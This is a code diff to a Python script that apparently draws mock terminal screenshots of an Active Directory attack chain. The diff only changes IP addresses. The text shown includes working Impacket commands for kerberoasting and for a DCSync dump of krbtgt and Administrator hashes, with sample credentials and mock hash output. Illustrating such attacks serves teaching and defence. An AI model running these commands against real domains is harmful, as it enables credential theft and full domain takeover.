@@ -222,7 +222,7 @@ def create_04_kerberoast():
     f_reg = get_font(FONT_MONO, 13)
 
     lines = [
-        ("kali@kali:~$ ", (59, 130, 246), "impacket-GetUserSPNs corp.local/jdoe:Summer2026! -dc-ip 10.0.0.5 -request", (255, 255, 255)),
+        ("kali@kali:~$ ", (59, 130, 246), "impacket-GetUserSPNs corp.local/jdoe:Summer2026! -dc-ip 192.168.100.5 -request", (255, 255, 255)),
         ("Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies", (130, 130, 130), "", (0,0,0)),
         ("", (0,0,0), "", (0,0,0)),
         ("ServicePrincipalName          Name     MemberOf      PasswordLastSet", (97, 214, 214), "", (0,0,0)),
@@ -275,7 +275,7 @@ def create_05_lateral():
         ("corp\\svc_sql", (250, 204, 21), "", (0,0,0)),
         ("", (0,0,0), "", (0,0,0)),
         ("[APP01.corp.local]: PS C:\\Users\\svc_sql\\Documents> ", (97, 214, 214), "ipconfig | findstr 'IPv4'", (255, 255, 255)),
-        ("   IPv4 Address. . . . . . . . . . . : 10.0.10.20", (220, 220, 220), "", (0,0,0)),
+        ("   IPv4 Address. . . . . . . . . . . : 192.168.100.20", (220, 220, 220), "", (0,0,0)),
         ("", (0,0,0), "", (0,0,0)),
         ("[APP01.corp.local]: PS C:\\Users\\svc_sql\\Documents> ", (97, 214, 214), "net localgroup Administrators", (255, 255, 255)),
         ("Members:", (180, 180, 180), "", (0,0,0)),
@@ -310,16 +310,16 @@ def create_06_domain_admin():
     f_reg = get_font(FONT_MONO, 13)
 
     lines = [
-        ("kali@kali:~$ ", (59, 130, 246), "impacket-secretsdump 'corp.local/svc_sql:SqlServiceDatabasePassword!@10.0.0.5' -just-dc-user krbtgt", (255, 255, 255)),
+        ("kali@kali:~$ ", (59, 130, 246), "impacket-secretsdump 'corp.local/svc_sql:SqlServiceDatabasePassword!@192.168.100.5' -just-dc-user krbtgt", (255, 255, 255)),
         ("Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies", (130, 130, 130), "", (0,0,0)),
-        ("[*] Target is DC01.corp.local (10.0.0.5)", (180, 180, 180), "", (0,0,0)),
+        ("[*] Target is DC01.corp.local (192.168.100.5)", (180, 180, 180), "", (0,0,0)),
         ("[*] Performing DCSync operation via MS-DRSR Directory Replication...", (59, 130, 246), "", (0,0,0)),
         ("[+] Target user account found: krbtgt", (74, 222, 128), "", (0,0,0)),
         ("", (0,0,0), "", (0,0,0)),
         ("[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)", (97, 214, 214), "", (0,0,0)),
         ("krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e50462719f9f8c6b7139d48b4e723223:::", (248, 113, 113), "", (0,0,0)),
         ("", (0,0,0), "", (0,0,0)),
-        ("kali@kali:~$ ", (59, 130, 246), "impacket-secretsdump 'corp.local/svc_sql:SqlServiceDatabasePassword!@10.0.0.5' -just-dc-user Administrator", (255, 255, 255)),
+        ("kali@kali:~$ ", (59, 130, 246), "impacket-secretsdump 'corp.local/svc_sql:SqlServiceDatabasePassword!@192.168.100.5' -just-dc-user Administrator", (255, 255, 255)),
         ("[*] Target user account found: Administrator", (74, 222, 128), "", (0,0,0)),
         ("Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5:::", (248, 113, 113), "", (0,0,0)),
         ("", (0,0,0), "", (0,0,0)),
